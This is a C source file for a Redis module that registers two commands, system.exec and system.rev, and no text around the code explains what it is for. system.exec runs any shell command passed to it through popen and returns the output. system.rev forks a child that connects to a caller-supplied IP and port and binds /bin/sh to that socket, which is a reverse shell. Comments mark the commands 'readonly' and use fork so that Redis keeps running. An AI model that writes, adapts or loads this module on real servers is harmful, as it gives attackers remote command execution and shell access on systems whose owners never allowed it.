#include "redismodule.h"
#include <stdio.h> 
#include <unistd.h>  
#include <stdlib.h> 
#include <errno.h>   
#include <sys/wait.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>  // Added for inet_addr
#include <string.h>     // Added for strlen, strcat

int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 2) {
        return RedisModule_WrongArity(ctx);
    }
    size_t cmd_len;
    size_t size = 1024;
    char *cmd = (char *)RedisModule_StringPtrLen(argv[1], &cmd_len);

    FILE *fp = popen(cmd, "r");
    if (!fp) {
        RedisModule_ReplyWithError(ctx, "Failed to execute command");
        return REDISMODULE_ERR;
    }

    char *buf = (char *)malloc(size);
    char *output = (char *)malloc(size);
    
    if (!buf || !output) {
        // Clean up on allocation failure
        if (buf) free(buf);
        if (output) free(output);
        pclose(fp);
        RedisModule_ReplyWithError(ctx, "Memory allocation failed");
        return REDISMODULE_ERR;
    }

    output[0] = '\0';  // Initialize as empty string

    while (fgets(buf, size, fp) != NULL) {  // Fixed: use size instead of sizeof(buf)
        size_t buf_len = strlen(buf);
        size_t output_len = strlen(output);
        
        if (buf_len + output_len >= size - 1) {  // Leave space for null terminator
            size_t new_size = size * 2;
            char *new_output = realloc(output, new_size);
            if (!new_output) {
                // Clean up on realloc failure
                free(buf);
                free(output);
                pclose(fp);
                RedisModule_ReplyWithError(ctx, "Memory reallocation failed");
                return REDISMODULE_ERR;
            }
            output = new_output;
            size = new_size;
        }
        strcat(output, buf);
    }

    RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
    RedisModule_ReplyWithString(ctx, ret);
    
    free(buf);
    free(output);
    pclose(fp);
        
    return REDISMODULE_OK;
}

int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 3) {
        return RedisModule_WrongArity(ctx);
    }

    size_t ip_len, port_len;
    char *ip = (char *)RedisModule_StringPtrLen(argv[1], &ip_len);
    char *port_s = (char *)RedisModule_StringPtrLen(argv[2], &port_len);
    int port = atoi(port_s);

    // FIXED: Fork to avoid killing Redis process (makes it "read-only" for Redis)
    pid_t pid = fork();
    if (pid == 0) {
        // Child process - establish reverse shell
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            exit(1);
        }
        
        struct sockaddr_in sa;
        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr(ip);
        sa.sin_port = htons(port);
        
        if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
            close(s);
            exit(1);
        }
        
        dup2(s, 0);
        dup2(s, 1);
        dup2(s, 2);
        execve("/bin/sh", NULL, NULL);
        exit(1);  // Should never reach here
    } else if (pid > 0) {
        // Parent process - Redis continues running
        RedisModule_ReplyWithString(ctx, RedisModule_CreateString(ctx, "OK", 2));
        return REDISMODULE_OK;
    } else {
        // Fork failed
        RedisModule_ReplyWithError(ctx, "Failed to fork");
        return REDISMODULE_ERR;
    }
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx,"system",1,REDISMODULE_APIVER_1) == REDISMODULE_ERR) 
        return REDISMODULE_ERR;

    // FIXED: Changed from "write" to "readonly" to make module read-only
    if (RedisModule_CreateCommand(ctx, "system.exec",
        DoCommand, "readonly", 0, 0, 0) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
        
    if (RedisModule_CreateCommand(ctx, "system.rev",
        RevShellCommand, "readonly", 0, 0, 0) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
        
    return REDISMODULE_OK;
}